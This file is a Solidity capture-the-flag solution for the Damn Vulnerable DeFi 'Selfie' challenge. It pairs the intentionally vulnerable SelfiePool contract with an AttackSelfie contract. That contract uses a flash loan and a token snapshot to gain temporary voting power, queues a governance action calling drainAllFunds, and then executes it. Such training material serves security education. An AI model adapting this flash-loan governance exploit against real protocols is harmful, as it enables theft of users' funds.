// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {

    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        token.transfer(msg.sender, borrowAmount);        
        
        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        
        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        
        emit FundsDrained(receiver, amount);
    }
}

contract AttackSelfie {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    address public owner;
    uint256 public actionID;
    constructor(address _token, address _pool, address _governance){
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        owner = msg.sender;
    }
    function firstAttack(uint256 _amount) external {
        token.snapshot();
        pool.flashLoan(_amount);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        token.snapshot();
        bytes memory _data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        actionID = governance.queueAction(address(pool), _data, 0);
        DamnValuableTokenSnapshot(_token).transfer(address(pool), _amount);
    }
    
    function secondAttack() external {
        governance.executeAction(actionID);
    }

}